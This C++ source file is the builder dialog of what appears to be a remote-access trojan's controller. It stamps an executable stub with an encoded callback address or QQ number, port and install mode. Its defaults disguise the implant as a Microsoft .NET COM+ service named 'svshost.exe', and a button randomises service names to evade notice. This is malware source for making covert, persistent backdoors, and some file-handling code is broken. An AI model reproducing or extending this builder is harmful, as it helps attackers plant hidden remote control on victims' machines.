// Build.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "Build.h"
#include "encode.h"
#include "ClientView.h"
#include "MD5.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CClientView* g_pTabView; 
/////////////////////////////////////////////////////////////////////////////
// CBuild dialog

CBuild::CBuild(CWnd* pParent /*=NULL*/)
	: CDialog(CBuild::IDD, pParent)
{
	//{{AFX_DATA_INIT(CBuild)
	m_green = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green", false);
	m_qq = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "QQ", false);
	//}}AFX_DATA_INIT
}


void CBuild::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuild)
	DDX_Control(pDX, IDC_QQ_NUM, m_qqnum);
	DDX_Control(pDX, IDC_VERSION, m_version);
	DDX_Control(pDX, IDC_INSTALL_WAY, m_insatll_way);
	DDX_Control(pDX, IDC_BIAOZHI, m_biaozhi);
	DDX_Control(pDX, IDC_GROUP_NAME, m_group_name);
	DDX_Control(pDX, IDC_SERVICE_DESCRIPTION, m_ServiceDescription);
	DDX_Control(pDX, IDC_SERVICE_DISPLAYNAME, m_ServiceDisplayName);
	DDX_Control(pDX, IDC_SERVICE_NAME, m_ServiceName);
	DDX_Control(pDX, IDC_PORT1, m_port1);
	DDX_Control(pDX, IDC_HOST1, m_host1);
	DDX_Check(pDX, IDC_GREEN, m_green);
	DDX_Check(pDX, IDC_QQ, m_qq);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuild, CDialog)
	//{{AFX_MSG_MAP(CBuild)
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_CBN_SELCHANGE(IDC_INSTALL_WAY, OnSelchangeInstallWay)
	ON_BN_CLICKED(IDC_GREEN, OnGreen)
	ON_BN_CLICKED(IDC_RANDOM, OnRandom)
	ON_BN_CLICKED(IDC_QQ, OnQq)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuild message handlers
char *StrAdd()	// GetVolumeInformation + GetComputerName
{
	LPCTSTR   new_name = "hbturkey";
	LPTSTR    pcname   = new   char[256];
	LPDWORD   nSize    = new   unsigned   long(256);
	BOOL   nRet=GetComputerName(pcname,nSize);
	
	CString strValue       = _T("");
	//LPTSTR   lpBuffer=new   char[256];
	//获得驱动器序列号   
	LPCTSTR   lpRootPathName   =   "C:\\";   
	LPTSTR   lpVolumeNameBuffer=new   char[12];   
	DWORD   nVolumeNameSize=12;   
	DWORD   VolumeSerialNumber;   
	DWORD   MaximumComponentLength;   
	DWORD   FileSystemFlags;   
	LPTSTR   lpFileSystemNameBuffer=new   char[10];   
	DWORD   nFileSystemNameSize=10;   
	GetVolumeInformation(lpRootPathName,lpVolumeNameBuffer,nVolumeNameSize,&VolumeSerialNumber,     
		&MaximumComponentLength,&FileSystemFlags,lpFileSystemNameBuffer,nFileSystemNameSize);   
	//显示驱动器序列号   
	CString   str;   
	//str.Format("驱动器%s的序列号为%x",lpRootPathName,VolumeSerialNumber);
	str.Format("%x",VolumeSerialNumber);
    char *lpBuffer = str.GetBuffer(str.GetLength() + 1);
    str.ReleaseBuffer();
	//::MessageBox(0,lpBuffer,"GetVolumeInformation",MB_ICONINFORMATION);
	//::MessageBox(0,pcname,"GetComputerName",MB_ICONINFORMATION);
	strcat(lpBuffer, pcname);
	//::MessageBox(0,lpBuffer,"GetVolumeInformation + GetComputerName",MB_ICONINFORMATION);
	return lpBuffer;
}

int StormRand(int count)
{
	unsigned long Time=GetTickCount();
	int seed=rand()+3;
	seed=(seed*Time)%count;
	return seed;
}

BOOL CBuild::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	m_group_name.SetFlatStyle(TRUE);
	m_insatll_way.SetFlatStyle(TRUE);
	m_ServiceDescription.SetFlatStyle(TRUE);
	m_ServiceDisplayName.SetFlatStyle(TRUE);
	m_ServiceName.SetFlatStyle(TRUE);
	m_port1.SetFlatStyle(TRUE);
	m_host1.SetFlatStyle(TRUE);
	m_version.SetFlatStyle(TRUE);
	m_qqnum.SetFlatStyle(TRUE);
	
	m_group_name.SetTheme(xtpControlThemeOfficeXP);
	m_insatll_way.SetTheme(xtpControlThemeOfficeXP);
	m_ServiceDescription.SetTheme(xtpControlThemeOfficeXP);
	m_ServiceDisplayName.SetTheme(xtpControlThemeOfficeXP);
	m_ServiceName.SetTheme(xtpControlThemeOfficeXP);
	m_port1.SetTheme(xtpControlThemeOfficeXP);
	m_host1.SetTheme(xtpControlThemeOfficeXP);
	m_version.SetTheme(xtpControlThemeOfficeXP);
	m_qqnum.SetTheme(xtpControlThemeOfficeXP);

	GetDlgItem(IDC_BIAOZHI)->SetWindowText(MD5String(StrAdd()));

	if (m_bFirstShow)
	{
		CString IP;

		char hostname[256]; 
		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
		if (host != NULL)
			IP = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
		else
			IP = _T("127.0.0.1");	
		
		UpdateData(false);
		
		SetDlgItemText(IDC_HOST1, ((CClientApp *)AfxGetApp())->m_IniFile.GetString(_T("Build"), _T("HOST"), IP));
		SetDlgItemText(IDC_QQ_NUM, ((CClientApp *)AfxGetApp())->m_IniFile.GetString(_T("Build"), _T("QQNum"), _T("10000")));
		SetDlgItemText(IDC_PORT1, ((CClientApp *)AfxGetApp())->m_IniFile.GetString(_T("Settings"), _T("ListenPort"), _T("8080")));
			
		SetDlgItemText(IDC_VERSION,((CClientApp *)AfxGetApp())->m_IniFile.GetString("Build", "Version", "v1.0"));
	
		SetDlgItemText(IDC_SERVICE_NAME,((CClientApp *)AfxGetApp())->m_IniFile.GetString(_T("Build"), _T("ServiceName"), _T(".Net CLR")));
		SetDlgItemText(IDC_SERVICE_DISPLAYNAME,((CClientApp *)AfxGetApp())->m_IniFile.GetString(_T("Build"), _T("DisplayName"), _T("Microsoft .Net Framework COM+ Support")));
		SetDlgItemText(IDC_SERVICE_DESCRIPTION,((CClientApp *)AfxGetApp())->m_IniFile.GetString(_T("Build"), _T("Description"), _T("Microsoft .NET and Windows XP COM+ Integration with SOAP")));
	}
	
	m_bFirstShow = false;

	UpdateData(false);
	
	CString strGroupName, strTemp;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	int i=0;
	for ( i = 0; i < nTabs; i++ )
	{
		strTemp = g_pTabView->m_wndTabControl.GetItem(i)->GetCaption();
		int n = strTemp.ReverseFind('(');
		if ( n > 0 )
		{
			strGroupName = strTemp.Left(n);
		}
		else
		{
			strGroupName = strTemp;
		}
		m_group_name.AddString(strGroupName);
	}
	m_group_name.SetCurSel(0);

	m_insatll_way.SetCurSel(0);
	
	m_qq = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "QQ", m_qq);
	if ( ((CButton *)GetDlgItem(IDC_QQ))->GetCheck() == TRUE )
	{
		GetDlgItem(IDC_QQ_NUM)->EnableWindow(TRUE);
		GetDlgItem(IDC_HOST1)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_QQ_NUM)->EnableWindow(FALSE);
		GetDlgItem(IDC_HOST1)->EnableWindow(TRUE);
	}

	m_green = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Build", "Green", m_green);
	if ( ((CButton *)GetDlgItem(IDC_GREEN))->GetCheck() == TRUE )
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(FALSE);
		GetDlgItem(IDC_SERVICE_NAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_SERVICE_DISPLAYNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_SERVICE_DESCRIPTION)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(TRUE);
		GetDlgItem(IDC_SERVICE_NAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_SERVICE_DISPLAYNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_SERVICE_DESCRIPTION)->EnableWindow(TRUE);
	}

	UpdateData(false);

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

int MemFindStr(const char *strMem, const char *strSub, int iSizeMem, int isizeSub)   
{   
	int   da,i,j;   
	if (isizeSub == 0) 
		da = strlen(strSub);   
	else 
		da = isizeSub;   
	for (i = 0; i < iSizeMem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (strMem[i+j] != strSub[j])	
				break;   
			if (j == da) 
				return i;   
	}  
	
	return -1;   
}

void CBuild::OnBuild() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString strHostA, strPortA, strSer, strSerDis, strSerDes, strGroup, strGetGroupName, strGetVersion, strQQnum;
	
	GetDlgItem(IDC_HOST1)->GetWindowText(strHostA);
	GetDlgItem(IDC_QQ_NUM)->GetWindowText(strQQnum);
	GetDlgItem(IDC_PORT1)->GetWindowText(strPortA);
	
	GetDlgItem(IDC_SERVICE_NAME)->GetWindowText(strSer);
	GetDlgItem(IDC_SERVICE_DISPLAYNAME)->GetWindowText(strSerDis);
	GetDlgItem(IDC_SERVICE_DESCRIPTION)->GetWindowText(strSerDes);
	
	GetDlgItem(IDC_BIAOZHI)->GetWindowText(strGetGroupName);
	GetDlgItem(IDC_VERSION)->GetWindowText(strGetVersion);

	((CComboBox*)GetDlgItem(IDC_GROUP_NAME))->GetWindowText(strGroup);

	CString OnInstallWay;
	m_insatll_way.GetLBText(m_insatll_way.GetCurSel(),OnInstallWay); 
	if(!m_green)
	{
		if (OnInstallWay == "服务启动")
		{
			if (strSer.IsEmpty() || strSerDis.IsEmpty() || strSerDes.IsEmpty() )
			{
				AfxMessageBox("请完整填写服务启动信息");
				return;
			}
		}
	}
	
	if (strHostA.IsEmpty() || strPortA.IsEmpty())
	{
		AfxMessageBox("请完整填写上线地址或者端口");
		return;
	}

	if (strGetVersion.IsEmpty())
	{
		AfxMessageBox("请完填写版本信息");
		return;
	}
	
	int int_chage1 = atoi((LPCSTR)strPortA);//CString 转换为int
	if (int_chage1 <=1 || int_chage1 >=65535)
	{
		::MessageBox(0,"端口1范围只能为1~65535之间的一个数","提示", MB_ICONINFORMATION);
		return;
	}

	if (strGroup.IsEmpty())
	{
		AfxMessageBox("请完整填写分组名");
		return;
	}

	CFileDialog dlg(FALSE, "exe", "svshost.exe", OFN_OVERWRITEPROMPT,"可执行文件|*.exe", NULL);
	if(dlg.DoModal () != IDOK)
		return;

	PCHAR str1 = "ABCD";		//上线地址
	PCHAR str2 = "CDEF";		//上线分组
	PCHAR str3 = "EFGH";		//服务名称
	PCHAR str4 = "GHIJ";		//显示名称
	PCHAR str5 = "IJKL";		//服务描述
	PCHAR str6 = "KLMN";		//分组唯一标识
	PCHAR str7 = "MNOP";		//版本信息
	PCHAR str8 = "OPQR";		//启动方式，I 服务启动 U 启动项
	PCHAR str9 = "STUV";		//G为绿色安装 K为启动安装
	PCHAR str0 = "UVWX";		//Q为QQ上线 D为域名或IP上线

	CHAR DatPath[MAX_PATH];
	HANDLE hFile = NULL, hUpdate = NULL;
	DWORD FileSize = 0, dwTmp = 0;
	PCHAR DllBuff = NULL;
	
	strHostA.Replace(" ", "");//把找到的空格填充掉
	strQQnum.Replace(" ", "");//把找到的空格填充掉
	strPortA.Replace(" ", "");//把找到的空格填充掉

	CString strAddress ;
	if (((CButton *)GetDlgItem(IDC_QQ))->GetCheck() == FALSE)
		strAddress = strHostA + ":" + strPortA;//域名上线构造
	else
		strAddress = strQQnum + ":" + strPortA;//QQ上线构造

	strAddress.MakeLower();
	strAddress = MyEncode(strAddress.GetBuffer(0));
	CString szDns = strAddress.GetBuffer(0);
	CString szGroup = MyEncode(strGroup.GetBuffer(0));
	CString SerName = MyEncode(strSer.GetBuffer(0));
	CString Serdisplay = MyEncode(strSerDis.GetBuffer(0));
	CString Serdesc = MyEncode(strSerDes.GetBuffer(0));
	CString szGetGroup = strGetGroupName.GetBuffer(0);
	CString szVersion = MyEncode(strGetVersion.GetBuffer(0));
	CString szInstall;
	CString szGreen;
	CString szOnline;
	if (((CButton *)GetDlgItem(IDC_GREEN))->GetCheck() == FALSE)
	{
		szGreen = "K";
		if (OnInstallWay == "服务启动")
		{
			szInstall = "I";
		}else
		if (OnInstallWay == "启动项启动")
		{
			szInstall = "U";
		}
	}else
	{
		szGreen = "G";
	}

	if (((CButton *)GetDlgItem(IDC_QQ))->GetCheck() == FALSE)
		szOnline = "D";
	else
		szOnline = "Q";

	try
	{
		GetModuleFileName( NULL, DatPath, sizeof(DatPath) );
		*strrchr( DatPath, '\\' ) = '\0';
		lstrcat( DatPath, "\\Cache\\Install.dat" );
		
		if ( GetFileAttributes(DatPath) == -1  )
			throw "没有找到dat";
		
		FileSize = GetFileSize( hFile, NULL );
		
		ReadFile( hFile, DllBuff, FileSize, &dwTmp, NULL );
		CloseHandle(hFile);
		if ( !CopyFile( DatPath, dlg.GetPathName(), NULL ) ) 
			throw "生成时错误1";
		hUpdate = BeginUpdateResource( dlg.GetPathName(), false);
		if ( !hUpdate ) 
			throw "生成时错误2";
		
		EndUpdateResource( hUpdate, false );
		CloseHandle(hUpdate);
		hFile = CreateFile( dlg.GetPathName(), GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
		if ( hFile == INVALID_HANDLE_VALUE ) 
			throw "生成时错误4";
		SetFilePointer( hFile, 0, NULL, FILE_END );
		
		WriteFile( hFile, str1, lstrlen(str1), &dwTmp, NULL );
		WriteFile( hFile, szDns.GetBuffer(0), szDns.GetLength() + 1, &dwTmp, NULL );
		WriteFile( hFile, str2, lstrlen(str2), &dwTmp, NULL );
		WriteFile( hFile, szGroup.GetBuffer(0), szGroup.GetLength() + 1, &dwTmp, NULL );
		WriteFile( hFile, str3, lstrlen(str3), &dwTmp, NULL );
		WriteFile( hFile, SerName.GetBuffer(0), SerName.GetLength() + 1, &dwTmp, NULL );
		WriteFile( hFile, str4, lstrlen(str4), &dwTmp, NULL );
		WriteFile( hFile, Serdisplay.GetBuffer(0), Serdisplay.GetLength() + 1, &dwTmp, NULL );
		WriteFile( hFile, str5, lstrlen(str5), &dwTmp, NULL );
		WriteFile( hFile, Serdesc.GetBuffer(0), Serdesc.GetLength() + 1, &dwTmp, NULL );
		WriteFile( hFile, str6, lstrlen(str6), &dwTmp, NULL );
		WriteFile( hFile, szGetGroup.GetBuffer(0), szGetGroup.GetLength() + 1, &dwTmp, NULL );
		WriteFile( hFile, str7, lstrlen(str7), &dwTmp, NULL );
		WriteFile( hFile, szVersion.GetBuffer(0), szVersion.GetLength() + 1, &dwTmp, NULL );
		WriteFile( hFile, str8, lstrlen(str8), &dwTmp, NULL );
		WriteFile( hFile, szInstall.GetBuffer(0), szInstall.GetLength() + 1, &dwTmp, NULL );
		WriteFile( hFile, str9, lstrlen(str9), &dwTmp, NULL );
		WriteFile( hFile, szGreen.GetBuffer(0), szGreen.GetLength() + 1, &dwTmp, NULL );
		WriteFile( hFile, str0, lstrlen(str0), &dwTmp, NULL );
		WriteFile( hFile, szOnline.GetBuffer(0), szOnline.GetLength() + 1, &dwTmp, NULL );

		char *szStrAdd;
		szStrAdd=new char[1024*1024];
		memset(szStrAdd,'.',10*10);
		
		WriteFile(hFile, szStrAdd, lstrlen(szStrAdd), &dwTmp, NULL);

		CloseHandle(hFile);
		MessageBox(_T("文件保存成功"),_T("提示"), MB_ICONINFORMATION);
	}
	catch (...)
	{
		if (DllBuff) free(DllBuff);
		DeleteFile(dlg.GetPathName());
	}

	if (((CButton *)GetDlgItem(IDC_QQ))->GetCheck() == FALSE)
		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "HOST", strHostA);
	else
		((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "QQNum", strQQnum);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "ServiceName", strSer);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "DisplayName", strSerDis);
	((CClientApp *)AfxGetApp())->m_IniFile.SetString("Build", "Description", strSerDes);

	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "Green", m_green);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("Build", "QQ", m_qq);

}

void CBuild::OnSelchangeInstallWay() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	CString OnInstallWay;
	
	m_insatll_way.GetLBText(m_insatll_way.GetCurSel(),OnInstallWay); 
	
	if (OnInstallWay == "服务启动")
	{
		GetDlgItem(IDC_SERVICE_NAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_SERVICE_DISPLAYNAME)->EnableWindow(TRUE);
		GetDlgItem(IDC_SERVICE_DESCRIPTION)->EnableWindow(TRUE);
	}
	if (OnInstallWay=="启动项启动")
	{
		GetDlgItem(IDC_SERVICE_NAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_SERVICE_DISPLAYNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_SERVICE_DESCRIPTION)->EnableWindow(FALSE);
	}
	UpdateData(FALSE);
}

void CBuild::OnGreen() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	if(m_green)
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(FALSE);
		GetDlgItem(IDC_SERVICE_NAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_SERVICE_DISPLAYNAME)->EnableWindow(FALSE);
		GetDlgItem(IDC_SERVICE_DESCRIPTION)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_INSTALL_WAY)->EnableWindow(TRUE);
		OnSelchangeInstallWay();
	}
	UpdateData(FALSE);
}

void CBuild::OnQq() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	
	if ( ((CButton *)GetDlgItem(IDC_QQ))->GetCheck() == TRUE )
	{
		GetDlgItem(IDC_QQ_NUM)->EnableWindow(TRUE);
		GetDlgItem(IDC_HOST1)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_QQ_NUM)->EnableWindow(FALSE);
		GetDlgItem(IDC_HOST1)->EnableWindow(TRUE);
	}
	UpdateData(FALSE);
}

static WORD RandMoniCount=0;

CHAR GetRandChar(BOOL  Capital,int i)
{
	DWORD iCount=GetTickCount()+i;
	
	iCount=(iCount+((CClientApp *)AfxGetApp())->GetRand())%25;
	
	CHAR Result=0;
	
	if(Capital)
		return	Result=65+iCount;
	else
		return  Result=97+iCount;
}

void CBuild::OnRandom() 
{
	// TODO: Add your control notification handler code here
	CHAR ServerName[20]={NULL};
	ZeroMemory(ServerName,20);
	RandMoniCount++;
	
	for (int i=0;i<19;i++)
	{
		if(i==0)
		{
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15)
		{
			ServerName[i]=' ';
			i++;
			ServerName[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerName[i]=GetRandChar(FALSE,i);
	}
	
	
	CHAR ServerShow[30]={NULL};
	ZeroMemory(ServerShow,30);
	
	for (i=0;i<29;i++)
	{
		if(i==0)
		{
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==6||i==15||i==24)
		{
			ServerShow[i]=' ';
			i++;
			ServerShow[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerShow[i]=GetRandChar(FALSE,i);
	}
	
	
	CHAR ServerDesc[40]={NULL};
	ZeroMemory(ServerDesc,40);
	
	for (i=0;i<39;i++)
	{
		if(i==0)
		{
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		if(i==8||i==18||i==26||i==35)
		{
			ServerDesc[i]=' ';
			i++;
			ServerDesc[i]=GetRandChar(TRUE,i);
			continue;
		}
		ServerDesc[i]=GetRandChar(FALSE,i);
	}
	
	SetDlgItemText(IDC_SERVICE_NAME,ServerName);
	SetDlgItemText(IDC_SERVICE_DISPLAYNAME,ServerShow);
	SetDlgItemText(IDC_SERVICE_DESCRIPTION,ServerDesc);
}
